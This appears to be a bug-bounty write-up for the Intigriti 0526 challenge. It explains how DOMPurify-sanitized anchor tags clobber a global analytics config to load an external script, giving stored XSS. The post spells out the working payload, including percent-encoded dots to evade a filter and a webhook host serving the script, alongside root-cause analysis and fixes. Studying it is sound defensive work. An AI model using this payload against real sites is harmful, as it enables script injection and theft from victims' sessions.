---
title: "Intigriti 0526: Stored XSS via DOM Clobbering in the Testimonial Feed"
date: 2026-05-27 10:00:00 +0700
categories: [Writeups, Web Security]
tags: [Intigriti, XSS, stored-xss, dom-clobbering, dompurify, bug-bounty, web-security, client-side-security]
permalink: /posts/intigriti-0526-stored-xss-dom-clobbering/
---

> **Summary:** I solved the Intigriti 0526 challenge by abusing a DOM clobbering primitive in sanitized testimonial content, turning harmless-looking anchors into a stored XSS chain.
{: .prompt-info }

## Introduction

This write-up covers my solution for the Intigriti 0526 challenge, where I found a stored cross-site scripting issue in the testimonial feed.

The interesting part of the bug was not a classic sanitizer bypass using an event handler or a `javascript:` URL. The application used DOMPurify before rendering user-submitted testimonial content, and the final payload only needed seemingly harmless anchor elements.

The issue came from a DOM clobbering primitive that allowed attacker-controlled markup to overwrite a global configuration object later trusted by the application.

## Target

- **Challenge:** Intigriti 0526
- **Asset:** `https://challenge-0526.intigriti.io`
- **Vulnerable page:** `https://challenge-0526.intigriti.io/challenge#testimonials`
- **Vulnerability type:** Stored cross-site scripting
- **Technique:** DOM clobbering

## Initial Observation

After logging in, users could submit testimonials that were later rendered in the community testimonial feed.

The rendering code looked safe at first glance because the submitted content was passed through DOMPurify before being inserted into the page:

```js
textDiv.innerHTML = DOMPurify.sanitize(t.content);
```

This blocks common XSS payloads such as inline event handlers, raw script tags, and dangerous URL schemes.

However, sanitization is only one part of the data flow. After rendering the testimonials, the page also used a global analytics configuration object:

```js
let config = window.PixelAnalyticsConfig || { enabled: false, scriptUrl: '/js/mock-tracker.js' };
if (config.enabled) {
    console.log("Loading tracking script from:", config.scriptUrl);
    let s = document.createElement('script');
    s.src = config.scriptUrl;
    document.body.appendChild(s);
}
```

This code assumes that `window.PixelAnalyticsConfig` is either absent or a legitimate JavaScript object.

That assumption is what made the page exploitable.

## Root Cause

Browsers expose certain named DOM elements as global `window` properties. For example, an element with an `id` or `name` can become available through `window.<name>`.

This behavior is known as DOM clobbering. It becomes dangerous when application code reads a global property and assumes it is a trusted JavaScript object.

In this challenge, DOMPurify still allowed anchor tags with attributes such as `id`, `name`, and `href`. That meant a testimonial could inject markup that created a clobbered `window.PixelAnalyticsConfig` value.

The goal was to make this condition pass:

```js
if (config.enabled) {
```

Then control this sink:

```js
s.src = config.scriptUrl;
```

The final trick was to use named anchors so that:

- `window.PixelAnalyticsConfig` exists
- `config.enabled` resolves to a truthy DOM element
- `config.scriptUrl` resolves to an anchor element
- assigning that anchor element to `s.src` coerces it to its `href`

## Payload

The final testimonial payload was:

```html
<a id=PixelAnalyticsConfig name=enabled></a><a id=PixelAnalyticsConfig name=scriptUrl href=https://dashing-moon-37%2ewebhook%2ecool/x.js></a>
```

The external endpoint returned JavaScript:

```js
alert(1337)
```

With this response header:

```http
Content-Type: application/javascript
```

The dots in the hostname were encoded as `%2e` because the server-side filter rejected literal `.` characters in submitted testimonial content.

## Exploitation Flow

1. I logged in to the challenge application.
2. I opened the testimonial submission flow.
3. I submitted the DOM clobbering payload as testimonial content.
4. The application stored the testimonial server-side.
5. When the testimonials page loaded, the application rendered the stored testimonial with DOMPurify.
6. The sanitized anchor elements still created a clobbered `window.PixelAnalyticsConfig`.
7. The analytics loader treated the clobbered DOM collection as its config object.
8. `config.enabled` evaluated as truthy.
9. `config.scriptUrl` resolved to the attacker-controlled anchor.
10. Assigning it to `script.src` caused the anchor to be stringified to its `href`.
11. The browser loaded and executed the attacker-controlled JavaScript.

![WebhookCool request showing the browser loading the attacker-controlled script](/assets/img/posts/intigriti-0526/webhookcool-script-request.svg)
_WebhookCool captured the browser requesting the attacker-controlled JavaScript as a script resource, with `challenge-0526.intigriti.io` as the referrer._

The result was stored XSS on:

```text
https://challenge-0526.intigriti.io/challenge#testimonials
```

## Why This Is Stored XSS

This was not self-XSS. The payload was stored by the application and later executed when another user viewed the testimonial feed.

The victim did not need to paste code into DevTools, modify their own browser state, or interact with an attacker-controlled page. They only needed to visit the affected testimonials page.

## Impact

An attacker could store JavaScript that executes in another user's browser under the trusted origin:

```text
challenge-0526.intigriti.io
```

In a real application, this could allow an attacker to:

- perform actions as the victim within the application
- read page-accessible user data
- alter trusted page content
- launch phishing flows from the trusted origin
- chain the issue with other application functionality

Even when cookies are protected with `HttpOnly`, same-origin JavaScript can often still interact with authenticated application endpoints and page state, so stored XSS remains impactful.

## Recommended Fix

The main fix is to avoid trusting clobberable global DOM properties for security-sensitive configuration.

The application should verify that the analytics config is a plain JavaScript object before using it:

```js
const config = window.PixelAnalyticsConfig;

if (
    config &&
    Object.getPrototypeOf(config) === Object.prototype &&
    config.enabled === true &&
    typeof config.scriptUrl === 'string'
) {
    const s = document.createElement('script');
    s.src = config.scriptUrl;
    document.body.appendChild(s);
}
```

Additional hardening:

- Avoid rendering testimonials as HTML unless rich text is required.
- Use `textContent` when plain text is enough.
- Configure DOMPurify to forbid risky `id` and `name` attributes in user-controlled HTML.
- Avoid dynamically loading scripts from user-influenced URLs.
- Add a restrictive Content Security Policy that only allows scripts from trusted origins.

## Takeaways

The key lesson from this challenge is that sanitized HTML can still be dangerous when the surrounding JavaScript trusts DOM-clobberable globals.

DOMPurify did its job against classic markup-based XSS payloads, but the application logic introduced a second bug by treating `window.PixelAnalyticsConfig` as a safe configuration object.

When reviewing client-side code, it is worth looking for patterns like:

```js
window.someConfig || fallback
```

especially when user-controlled HTML is rendered before the config is read.

## Disclosure Note

This write-up was published after the challenge ended and Intigriti allowed public write-ups for the competition.

After publishing, the write-up link can be added as a comment on the accepted Intigriti submission so the team can tag and evaluate it for the challenge.
